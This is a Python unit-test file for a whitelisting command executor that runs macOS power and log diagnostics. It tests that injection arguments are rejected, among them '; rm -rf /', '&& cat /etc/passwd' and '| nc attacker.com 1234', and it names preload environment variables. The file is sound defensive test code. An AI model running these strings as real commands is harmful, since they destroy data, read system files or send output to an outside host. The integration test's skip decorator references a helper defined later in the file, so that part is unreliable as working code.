#!/usr/bin/env python3
"""
Unit tests for SecureCommandExecutor
Tests command validation, whitelisting, and security features
"""

import unittest
from unittest.mock import patch, MagicMock
import subprocess
from secure_executor import SecureCommandExecutor, SecurityError, CommandResult


class TestSecureCommandExecutor(unittest.TestCase):
    """Test cases for SecureCommandExecutor"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.executor = SecureCommandExecutor()
    
    def test_allowed_command_execution(self):
        """Test execution of whitelisted commands"""
        # Test pmset_log command
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                stdout="test output",
                stderr="",
                returncode=0
            )
            
            result = self.executor.execute_command('pmset_log')
            
            self.assertIsInstance(result, CommandResult)
            self.assertEqual(result.stdout, "test output")
            self.assertEqual(result.return_code, 0)
            
            # Verify subprocess.run was called with correct parameters
            mock_run.assert_called_once()
            call_args = mock_run.call_args[0][0]
            self.assertEqual(call_args, ['pmset', '-g', 'log'])
            
            # Verify shell=False for security
            call_kwargs = mock_run.call_args[1]
            self.assertFalse(call_kwargs.get('shell', False))
    
    def test_disallowed_command_rejection(self):
        """Test rejection of non-whitelisted commands"""
        with self.assertRaises(SecurityError) as context:
            self.executor.execute_command('rm_rf')
        
        self.assertIn("Nepovolený příkaz", str(context.exception))
    
    def test_argument_validation(self):
        """Test validation of command arguments"""
        # Test with safe arguments
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
            
            result = self.executor.execute_command('log_show', ['--last', '1h'])
            self.assertIsInstance(result, CommandResult)
        
        # Test with dangerous arguments (shell injection attempt)
        dangerous_args = [
            '; rm -rf /',
            '&& cat /etc/passwd',
            '| nc attacker.com 1234',
            '`whoami`',
            '$(ls -la)',
            '\n/bin/sh',
            '../../../etc/passwd'
        ]
        
        for arg in dangerous_args:
            with self.assertRaises(SecurityError) as context:
                self.executor.execute_command('log_show', [arg])
            
            self.assertIn("Neplatný argument", str(context.exception))
    
    def test_command_timeout(self):
        """Test command timeout handling"""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(['test'], 30)
            
            result = self.executor.execute_command('pmset_log', timeout=30)
            
            self.assertEqual(result.stdout, "")
            self.assertEqual(result.stderr, "Command timed out after 30 seconds")
            self.assertEqual(result.return_code, -1)
    
    def test_command_execution_error(self):
        """Test handling of command execution errors"""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = Exception("Test error")
            
            result = self.executor.execute_command('pmset_log')
            
            self.assertEqual(result.stdout, "")
            self.assertIn("Error executing command", result.stderr)
            self.assertEqual(result.return_code, -1)
    
    def test_output_size_limit(self):
        """Test output size limiting"""
        with patch('subprocess.run') as mock_run:
            # Create large output
            large_output = "x" * (self.executor.MAX_OUTPUT_SIZE + 1000)
            mock_run.return_value = MagicMock(
                stdout=large_output,
                stderr="",
                returncode=0
            )
            
            result = self.executor.execute_command('pmset_log')
            
            # Verify output was truncated
            self.assertEqual(len(result.stdout), self.executor.MAX_OUTPUT_SIZE)
            self.assertTrue(result.stdout.endswith("[ZKRÁCENO]"))
    
    def test_pipe_command_execution(self):
        """Test execution of piped commands"""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                stdout="filtered output",
                stderr="",
                returncode=0
            )
            
            result = self.executor.execute_piped_command(
                'pmset_log', 
                'grep "Wake"'
            )
            
            self.assertEqual(result.stdout, "filtered output")
            
            # Verify two subprocess calls were made
            self.assertEqual(mock_run.call_count, 2)
    
    def test_pipe_command_validation(self):
        """Test validation of pipe commands"""
        # Test with command that doesn't allow piping
        with self.assertRaises(SecurityError) as context:
            self.executor.execute_piped_command(
                'pmset_assertions',
                'grep "test"'
            )
        
        self.assertIn("nepodporuje pipe", str(context.exception))
    
    def test_safe_environment(self):
        """Test safe environment variable handling"""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
            
            self.executor.execute_command('pmset_log')
            
            # Check environment variables were cleaned
            call_kwargs = mock_run.call_args[1]
            env = call_kwargs.get('env', {})
            
            # Verify no dangerous environment variables
            dangerous_vars = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES']
            for var in dangerous_vars:
                self.assertNotIn(var, env)
    
    def test_stderr_capture(self):
        """Test proper stderr capture"""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                stdout="",
                stderr="Error message",
                returncode=1
            )
            
            result = self.executor.execute_command('pmset_log')
            
            self.assertEqual(result.stderr, "Error message")
            self.assertEqual(result.return_code, 1)
    
    def test_execution_time_measurement(self):
        """Test execution time is measured"""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
            
            result = self.executor.execute_command('pmset_log')
            
            self.assertGreaterEqual(result.execution_time, 0)
            self.assertIsInstance(result.execution_time, float)
    
    def test_special_characters_in_output(self):
        """Test handling of special characters in command output"""
        special_outputs = [
            "Line with \x00 null byte",
            "Unicode: čěščťžýáíé",
            "Control chars: \x01\x02\x03",
            "Mixed\nnewlines\r\nand\rreturns"
        ]
        
        for output in special_outputs:
            with patch('subprocess.run') as mock_run:
                mock_run.return_value = MagicMock(
                    stdout=output,
                    stderr="",
                    returncode=0
                )
                
                result = self.executor.execute_command('pmset_log')
                # Should handle special characters without crashing
                self.assertIsInstance(result.stdout, str)


class TestSecureCommandExecutorIntegration(unittest.TestCase):
    """Integration tests with real commands (if safe to run)"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.executor = SecureCommandExecutor()
    
    @unittest.skipIf(not _is_safe_to_run_integration_tests(), 
                     "Skipping integration tests - not on macOS or CI environment")
    def test_real_command_execution(self):
        """Test with real system commands"""
        # Test with a safe command like 'last reboot | head -1'
        result = self.executor.execute_piped_command('last_reboot', 'head -1')
        
        # Should get some output without errors
        self.assertEqual(result.return_code, 0)
        self.assertIsInstance(result.stdout, str)


def _is_safe_to_run_integration_tests():
    """Check if it's safe to run integration tests"""
    import platform
    import os
    
    # Only run on macOS and not in CI
    return (platform.system() == 'Darwin' and 
            not os.environ.get('CI', False))


if __name__ == '__main__':
    unittest.main(verbosity=2)